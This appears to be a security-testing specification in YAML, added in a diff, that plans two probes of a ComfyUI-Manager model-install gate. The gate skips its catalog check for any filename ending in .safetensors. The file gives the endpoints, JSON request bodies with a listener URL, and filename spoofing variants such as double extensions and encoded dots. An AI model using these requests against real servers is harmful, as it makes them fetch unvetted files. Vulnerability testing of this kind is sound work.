@@ -1,0 +1,78 @@
+loop_id: loop-4
+unit_id: Service:model-download
+class: Business-logic bypass of the model catalog membership control
+class_skill: business-logic
+slice:
+  source: trust_agreement
+  statement: "TA3: the gate trusts the filename suffix as the discriminator of scrutiny - a lowercase .safetensors suffix marks the item safe and skips catalog membership entirely (F1), while the payload behind the name is never inspected. The loop opens the selector space where the attacker drives the scrutiny branch by choosing the name."
+discrimination:
+  axes_used: [chaining-advanced, tech-misconfiguration]
+  boundary: "the suffix as a selector value: canonical-literal selection of the unchecked branch (s1) versus the terminal-literal predicate's boundary and its differential against downstream name resolution (s2); fault fixed at F1."
+  narrow_broad_tradeoff: "narrow on the selector surface (one branch test, two spec questions) and broad on catalogue-controlled contrast cases; the bypass is OBSERVED, so coverage means pinning the selector's exact surface without wandering into the URL-substitution fault that loop-7 owns."
+specs:
+- spec_id: loop-4-s1
+  label: "suffix-selected scrutiny bypass"
+  sub_slice: "Triples provably absent from the default-channel catalog whose filename ends in the lowercase literal .safetensors: the gate skips the membership check, the item queues with 200 and is fetched without provenance validation (anchors P09/P13/P47, contrast P11/P12 400); owned region = the branch selector that turns scrutiny off."
+  class_skill_parametrisation:
+    skill: business-logic
+    inputs: {transition: "ET1 gate -> queue", selector: "filename terminal literal driving the scrutiny ruleset", contrast_controls: "non-catalog non-safetensors triple -> 400 (P11/P12); uppercase suffix -> 400 (P47)", catalogue: "GET /externalmodel/getlist?mode=default"}
+  concretisation:
+    protocol: http
+    technology: "ComfyUI-Manager V3.37 install gate and queue on aiohttp 3.14.3"
+    endpoint: "POST /manager/queue/install_model then GET /manager/queue/start; catalog read via GET /externalmodel/getlist?mode=default"
+    parameter: "filename (selector), name and save_path (free once selected)"
+    method: "POST then GET"
+    body: '{"name": "t1-random", "url": "http://<listener>/marker", "filename": "t1-not-in-catalog.safetensors", "save_path": "unknown-dir"}'
+    headers: {"Content-Type": "application/json"}
+  discrimination_axis: chaining-advanced
+  discrimination_note: "Owns the selector value itself: the unchecked branch exists and is driven by the client-chosen name, independent of spelling edge cases. Nearest sibling s2 owns where the predicate's edge lies and how the accepted name resolves; s1 uses only canonical-literal names so the two never share a payload."
+  chaining_advanced_note: "Structural selector mapping: the business-logic class skill names selector-driven ruleset changes (currency/locale switching price rules); here the filename terminal literal is the selector that switches the scrutiny ruleset, and the checked path (the assumption that .safetensors proves ecosystem membership, A1) is skipped. The skill lacks a file-gate entity; the mapping from selector value to skipped control is carried structurally from the payload's IA3/TA3."
+  proxy_technique: "Read the catalog once to construct triples provably outside it (name/save_path/filename not in any entry); send the .safetensors-named triple beside a non-safetensors control with identical free attributes; the accepted item is drained and the fetch lands at the listener, correlating acceptance with execution."
+  verification_symptoms: ["200 for the .safetensors triple while the non-safetensors control with the same triple gets 400, isolating the suffix rule", "the accepted item is fetched and written (listener hit and/or model-tree entry) proving the bypass carries through execution, not only past the gate"]
+  payload_vector_space:
+    method: "POST install_model -> GET start"
+    path: "/manager/queue/install_model, /api/manager/queue/install_model, /manager/queue/start"
+    parameter: "filename with canonical terminal literal .safetensors; name/save_path/url free"
+    body: "JSON install item with a non-catalog triple and listener URL"
+    headers: {"Content-Type": "application/json"}
+  assumptions: ["the catalog is enumerable via getlist and the constructed triple is absent from it (IA10)", "the gate has exactly two scrutiny branches keyed on the suffix (IA2/IA3)"]
+  rationale: "If F1 is implemented (suffix as scrutiny discriminator), catalog membership stops being a control for any name the attacker decorates: the trusted queued state is entered on a string test alone. P09/P13 already executed this leg; the spec fixes the selector-to-branch mapping and its contrast."
+  interpretation_guidance: "Symptom-present = accepted non-catalog triple under a canonical .safetensors name, plus a fetched/written artifact for it, while the matched control gets 400. Symptom-absent = the candidate is refused like its control (400/403) or accepted without execution: the shortcut is closed or the pipeline re-validates downstream; a 200 alone is insufficient without the fetch leg."
+- spec_id: loop-4-s2
+  label: "terminal-literal boundary and name resolution"
+  sub_slice: "The exact predicate behind the branch selector, probed at its edges: case variants, trailing dot/space, encoded dots, embedded and double extensions, NUL-adjacent forms; region = which names the terminal-literal test accepts and whether the accepted string is the name the filesystem and the loader later resolve (P47 anchor: uppercase refused)."
+  class_skill_parametrisation:
+    skill: business-logic
+    inputs: {predicate_anchor: "lowercase suffix test (IA3, P47)", probe_families: "input-surface shape manipulation (alternate encodings, trailing symbols, boundary shapes) from the class skill", resolution_surfaces: "model-tree listings and stored filename (IA11)"}
+  concretisation:
+    protocol: http
+    technology: "Python 3.11 string handling in the V3.37 gate; POSIX filesystem storage of the accepted name"
+    endpoint: "POST /manager/queue/install_model then GET /manager/queue/start; readback via IA11 listings"
+    parameter: filename spellings around the terminal literal
+    method: "POST then GET"
+    body: '{"name": "x", "url": "http://<listener>/marker", "filename": "t1-pred-<variant>.safetensors", "save_path": "checkpoints"}'
+    headers: {"Content-Type": "application/json"}
+  discrimination_axis: tech-misconfiguration
+  discrimination_note: "Owns the predicate-resolvable gap: the compared string versus the string the stack later resolves. s1 uses only the canonical literal; s2 mutates the literal's neighbourhood and the downstream resolution, so the two specs share no accepted payload and answer different questions (branch exists vs where its edge sits)."
+  chaining_advanced_note: null
+  proxy_technique: "Submit each decorated spelling as its own candidate with a marker body: record the gate verdict (400/403/200) and, when accepted, whether the stored entry's name matches the submitted string byte-for-byte or a normalized variant; the filesystem listing is the resolution oracle."
+  verification_symptoms: ["a per-spelling accept/refuse map for the predicate (canonical lowercase accepted anchor; uppercase refused anchor P47)", "for accepted decorated spellings: the stored entry name shows normalization (or exact preservation) revealing the compared-vs-resolved differential"]
+  payload_vector_space:
+    method: "POST install_model -> GET start"
+    path: "/manager/queue/install_model, /api/manager/queue/install_model"
+    parameter: "filename variants: case (x.Safetensors, x.safetensors.XCASE), trailing dot/space, encoded dot (%2e), embedded (.safetensors.exe), doubled (.pth.safetensors), NUL-adjacent"
+    body: "JSON install item with listener URL"
+    headers: {"Content-Type": "application/json"}
+  assumptions: ["the predicate compares the raw submitted string (P47)", "the JSON body transports the filename verbatim (IA1) and POSIX accepts trailing dot/space names; encoding is not further decoded before the test", "one candidate per spelling keeps attribution exact"]
+  rationale: "F1's fault is the predicate itself; a terminal-literal test has an undefined neighbourhood (case, decoration, encoding) and a second differential at resolution time. If the stack's string comparison and its later name resolution diverge, the selector's surface is wider (or narrower) than the IA3 statement implies, and that surface change is a distinct failure mode."
+  interpretation_guidance: "Symptom-present = a decorated spelling is accepted into the unchecked branch and either reaches the fetch or is stored under a normalized name that differs from the compared string; the boundary is wider than the canonical literal. Symptom-absent = every non-canonical spelling is refused and stored names always equal compared strings: the predicate is exact; record the map. Refusal of one spelling never generalises to the family."
+checks:
+  overlap:
+    status: none
+    notes: "s1 owns the selector branch with canonical names; s2 owns the predicate's boundary and the compared-vs-resolved differential with decorated names. Disjoint accepted payloads, different questions and oracles (branch contrast vs spelling map plus name-resolution compare)."
+  coverage:
+    status: exhaustive
+    uncovered: []
+    notes: "The suffix selector's surface is covered: branch existence (s1) and predicate/resolution boundary (s2). URL-side controls (set membership, cross-entry substitution) belong to loop-7's fault F12 and are excluded here by the slice statement."
+  well_formedness_statement: "Two specs partition the suffix-as-selector region of F1: one fixes the existence and effect of the unchecked branch, the other maps its predicate edges and the compared-versus-resolved name differential. Each owns a disjoint name family and carries its own oracle; their union covers the selector surface the payload evidences."
+degradations: ["The precise suffix-test implementation is unobservable from outside; s2 treats it as a raw-string terminal-literal test per P47 and declares the assumption.", "The class skill lacks a gate-selector entity; the selector-to-ruleset mapping is carried structurally from the class's ruleset-switch vocabulary."]
